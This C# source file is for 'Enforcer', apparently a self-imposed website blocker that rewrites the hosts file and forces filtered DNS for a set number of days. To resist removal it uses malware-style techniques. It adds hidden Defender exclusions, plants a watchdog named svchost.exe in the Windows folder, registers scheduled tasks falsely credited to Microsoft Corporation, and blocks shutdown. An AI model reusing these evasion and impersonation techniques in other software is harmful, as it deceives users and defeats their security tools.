using Microsoft.Win32.TaskScheduler;
using System.Diagnostics;
using System.Globalization;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using Task = System.Threading.Tasks.Task;

/*
MIT License

Copyright (c) 2024 Nicholas Aidan Stewart

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

namespace Enforcer
{
    public partial class Main : Form
    {
        [LibraryImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static partial bool ShutdownBlockReasonCreate(IntPtr hWnd, [MarshalAs(UnmanagedType.LPWStr)] string pwszReason);
        readonly string daemonPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SSDaemon.exe");
        readonly string windowsPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        readonly List<FileStream> filePadlocks = [];
        readonly Config config = Config.Instance;
        readonly string watchdogPath;
        bool isEnforcerActive = true;
        Process watchdog;

        public Main(string[] args)
        {
            InitializeComponent();
            watchdogPath = Path.Combine(windowsPath, "svchost.exe");
            if (config.Read("days-enforced").Equals("0"))
            {
                isEnforcerActive = false;
                SetHosts();
                SetCleanBrowsingDNS();
            }
            else
            {
                AddDefenderExclusion(AppDomain.CurrentDomain.BaseDirectory);
                InitializeWatchdog(args);
                SetHosts();
                ShutdownBlockReasonCreate(Handle, "Enforcer is active.");
                InitializeLock();
            }
            Environment.Exit(0);
        }

        void InitializeWatchdog(string[] args)
        {
            AddDefenderExclusion(watchdogPath);
            if (args.Length > 0)
                watchdog = Process.GetProcessById(int.Parse(args[0]));
            else
            {
                try
                {
                    foreach (string file in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*svchost*"))
                        File.Move(file, Path.Combine(windowsPath, Path.GetFileName(file)));
                }
                catch (IOException) { }
            }
            watchdog ??= Process.GetProcessById(StartWatchdog());
            Task.Run(() =>
            {
                while (isEnforcerActive)
                {
                    watchdog.WaitForExit();
                    watchdog.Close();
                    if (!isEnforcerActive)
                        continue;
                    watchdog = Process.GetProcessById(StartWatchdog());
                }
            });
            foreach (string file in Directory.GetFiles(windowsPath, "*svchost*"))
                filePadlocks.Add(new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read));
        }

        int StartWatchdog()
        {
            using Process executor = new();
            executor.StartInfo.FileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SSExecutor.exe");
            executor.StartInfo.Arguments = $"\"{watchdogPath}\" {Environment.ProcessId}";
            executor.StartInfo.CreateNoWindow = true;
            executor.StartInfo.RedirectStandardOutput = true;
            executor.Start();
            var executorResponse = executor.StandardOutput.ReadLine();
            return executorResponse == null ? throw new NullReferenceException("No pid returned from executor.") : int.Parse(executorResponse);
        }

        void SetHosts()
        {
            var hosts = Path.Combine(windowsPath, "System32\\drivers\\etc\\hosts");
            try
            {
                if (config.Read("hosts-filter").Equals("off"))
                {
                    if (!isEnforcerActive)
                        File.WriteAllText(hosts, string.Empty);
                }
                else
                {
                    File.WriteAllText(hosts, File.ReadAllText(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"{config.Read("hosts-filter")}.hosts")));
                    if (isEnforcerActive)
                        filePadlocks.Add(new FileStream(hosts, FileMode.Open, FileAccess.Read, FileShare.Read));
                }
            }
            catch (IOException) { }
        }

        void InitializeLock()
        {
            filePadlocks.Add(new FileStream(config.ConfigFile, FileMode.Open, FileAccess.Read, FileShare.Read));
            foreach (var file in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*", SearchOption.AllDirectories))
                filePadlocks.Add(new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.Read));
            while (isEnforcerActive)
            {
                if (IsExpired())
                {
                    isEnforcerActive = false;             
                    foreach (var filePadlock in filePadlocks)
                        filePadlock.Close();
                    using var taskService = new TaskService();
                    TaskFolder(taskService).DeleteTask("SvcStartup", false);
                    TaskFolder(taskService).DeleteTask("SvcMonitor", false);
                    watchdog.Kill();
                }
                else
                {
                    SetCleanBrowsingDNS();
                    RegisterTask("SvcStartup", new LogonTrigger());
                    RegisterTask("SvcMonitor", new TimeTrigger() { StartBoundary = DateTime.Now, Repetition = new RepetitionPattern(TimeSpan.FromMinutes(1), TimeSpan.Zero) });
                    Thread.Sleep(4000);
                }          
            }
        }

        bool IsExpired()
        {        
            DateTime? networkDateTime = null;
            try
            {
                using var tcpClient = new TcpClient();
                if (tcpClient.ConnectAsync("time.nist.gov", 13).Wait(500))
                {
                    using var streamReader = new StreamReader(tcpClient.GetStream());
                    networkDateTime = DateTime.ParseExact(streamReader.ReadToEnd().Substring(7, 17), "yy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal);
                }
            }
            catch (SocketException) { }
            DateTime.TryParse(config.Read("date-enforced"), out DateTime dateEnforced);
            return networkDateTime != null && networkDateTime >= dateEnforced.AddDays(int.Parse(config.Read("days-enforced")));
        }

        void SetCleanBrowsingDNS()
        {
            try
            {
                string[]? dns;
                if (!isEnforcerActive && config.Read("cleanbrowsing-dns-filter").Equals("off"))
                    dns = null;
                else if (config.Read("cleanbrowsing-dns-filter").Equals("family"))
                    dns = ["185.228.168.168", "185.228.169.168"];
                else if (config.Read("cleanbrowsing-dns-filter").Equals("adult"))
                    dns = ["185.228.168.10", "185.228.169.11"];
                else
                    return;
                var currentInterface = GetActiveEthernetOrWifiNetworkInterface();
                if (currentInterface != null)
                {
                    foreach (ManagementObject objMO in new ManagementClass("Win32_NetworkAdapterConfiguration").GetInstances().Cast<ManagementObject>())
                    {
                        if ((bool)objMO["IPEnabled"])
                        {
                            if (objMO["Description"].Equals(currentInterface.Description))
                            {
                                var objdns = objMO.GetMethodParameters("SetDNSServerSearchOrder");
                                if (objdns != null)
                                {
                                    objdns["DNSServerSearchOrder"] = dns;
                                    objMO.InvokeMethod("SetDNSServerSearchOrder", objdns, null);
                                }
                            }
                        }
                    }
                }
            }
            catch (FileLoadException) { }
        }

        NetworkInterface? GetActiveEthernetOrWifiNetworkInterface()
        {
            return NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(
                a => a.OperationalStatus == OperationalStatus.Up &&
                (a.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || a.NetworkInterfaceType == NetworkInterfaceType.Ethernet) &&
                a.GetIPProperties().GatewayAddresses.Any(g => g.Address.AddressFamily.ToString().Equals("InterNetwork")));
        }

        void RegisterTask(string name, Trigger taskTrigger)
        {
            using var taskService = new TaskService();
            taskService.RootFolder.DeleteTask(name, false);
            var taskDefinition = taskService.NewTask();
            taskDefinition.Settings.DisallowStartIfOnBatteries = false;
            taskDefinition.RegistrationInfo.Author = "Microsoft Corporation";
            taskDefinition.RegistrationInfo.Description = "Ensures all critical Windows service processes are running.";
            taskDefinition.Principal.RunLevel = TaskRunLevel.Highest;
            taskDefinition.Triggers.Add(taskTrigger);
            taskDefinition.Actions.Add(new ExecAction(daemonPath));
            TaskFolder(taskService).RegisterTaskDefinition(name, taskDefinition);
        }

        void AddDefenderExclusion(string path)
        {
            using Process powershell = new();
            powershell.StartInfo.FileName = "powershell";
            powershell.StartInfo.UseShellExecute = false;
            powershell.StartInfo.CreateNoWindow = true;
            powershell.StartInfo.Verb = "runas";
            powershell.StartInfo.Arguments = $" -Command Add-MpPreference -ExclusionPath '{path}' -ExclusionProcess '{daemonPath}'";
            powershell.Start();
        }

        TaskFolder TaskFolder(TaskService taskService)
        {
            return taskService.GetFolder("\\Microsoft\\Windows\\Maintenance") ?? taskService.RootFolder;
        }

        protected override void WndProc(ref Message aMessage)
        {
            if (aMessage.Msg == 0x0011)
                return;
            base.WndProc(ref aMessage);
        }
    }
}